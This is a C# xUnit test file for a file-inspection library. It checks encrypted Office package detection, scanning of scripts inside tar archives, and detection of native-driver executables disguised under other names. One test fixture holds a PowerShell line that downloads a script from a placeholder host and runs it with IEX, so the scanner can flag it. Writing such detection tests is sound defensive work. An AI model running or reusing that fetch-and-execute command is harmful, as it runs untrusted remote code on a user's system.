using System.IO.Compression;
using Xunit;

namespace FileInspectorX.Tests;

public sealed class ArchiveEvidenceRegressionTests
{
    [Fact]
    public void EncryptedOoxmlPayloadDefersDeepInspectionWithoutZipEncryptionBit()
    {
        using var input = new MemoryStream();
        using (var zip = new ZipArchive(input, ZipArchiveMode.Create, leaveOpen: true))
            foreach (var name in new[] { "EncryptionInfo", "EncryptedPackage" })
            {
                using var writer = new StreamWriter(zip.CreateEntry(name).Open());
                writer.Write("opaque encrypted payload");
            }
        input.Position = 0;

        var analysis = FileInspector.Analyze(input, Options(), "encrypted.zip");

        Assert.True(analysis.Flags.HasFlag(ContentFlags.OoxmlEncrypted));
        Assert.False(analysis.Flags.HasFlag(ContentFlags.ArchiveHasEncryptedEntries));
        Assert.False(analysis.AnalysisComplete);
        Assert.Contains("archive:encrypted-content-unavailable", analysis.AnalysisIssues!);
        Assert.Equal("Defer", analysis.Assessment!.Decision.ToString());
    }

    [Theory]
    [InlineData(true)]
    [InlineData(false)]
    public void TarChildReferencesFollowTheRequestedReferenceStage(bool includeReferences)
    {
        var bytes = System.Text.Encoding.UTF8.GetBytes("$u = 'https://outside.example/payload.ps1'\n$s = '\\\\files.example\\share\\payload.ps1'\nInvoke-WebRequest -Uri $u -OutFile $env:TEMP\\payload.ps1\nIEX (Get-Content $env:TEMP\\payload.ps1 -Raw)");
        using var tar = Tar("payload.ps1", bytes);
        var options = Options();
        options.IncludeReferences = includeReferences;

        var analysis = FileInspector.Analyze(tar, options, "bundle.tar");

        Assert.Contains("archive:inner-script-download", analysis.InnerFindings!);
        if (includeReferences)
        {
            Assert.Contains(analysis.References!, reference => reference.Kind == ReferenceKind.Url
                && reference.Value == "https://outside.example/payload.ps1" && reference.SourceTag == "archive:inner");
            Assert.Contains(analysis.References!, reference => reference.Kind == ReferenceKind.FilePath
                && reference.Value == @"\\files.example\share" && reference.SourceTag == "archive:inner");
        }
        else
            Assert.True(analysis.References == null || analysis.References.Count == 0);
    }

    [Theory]
    [InlineData("driver.sys", false)]
    [InlineData("panel.cpl", false)]
    [InlineData("notes.txt", true)]
    public void NativeDriverTarMemberRetainsSampleCountAndCorrectDisguiseEvidence(string name, bool disguised)
    {
        var bytes = TestHelpers.CreateMinimalPe();
        bytes[0xdc] = 1; // IMAGE_SUBSYSTEM_NATIVE in the PE32 optional header.
        using var tar = Tar(name, bytes);
        var path = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString("N") + ".tar");
        try
        {
            File.WriteAllBytes(path, tar.ToArray());
            var options = Options();
            options.IncludeAuthenticode = true;
            options.Settings = options.Settings! with { VerifyAuthenticodeWithWinTrust = true };

            var analysis = FileInspector.Analyze(path, options);

            Assert.True(analysis.Flags.HasFlag(ContentFlags.ContainerContainsExecutables));
            Assert.Equal(1, analysis.InnerExecutablesSampled);
            Assert.Equal(0, analysis.InnerSignedExecutables);
            Assert.Equal(disguised, analysis.Flags.HasFlag(ContentFlags.ContainerHasDisguisedExecutables));
        }
        finally { File.Delete(path); }
    }

    private static FileInspector.DetectionOptions Options() => new()
    {
        Settings = InspectionSettings.CaptureDefaults() with { DeepContainerScanEnabled = true },
        IncludeAuthenticode = false, IncludePermissions = false, IncludeInstaller = false
    };

    private static MemoryStream Tar(string name, byte[] bytes)
    {
        var stream = new MemoryStream();
        InspectionIntegrityTests.WriteTarHeader(stream, name, size: bytes.Length);
        stream.Write(bytes, 0, bytes.Length);
        stream.Write(new byte[(512 - bytes.Length % 512) % 512 + 1024], 0, (512 - bytes.Length % 512) % 512 + 1024);
        stream.Position = 0;
        return stream;
    }
}
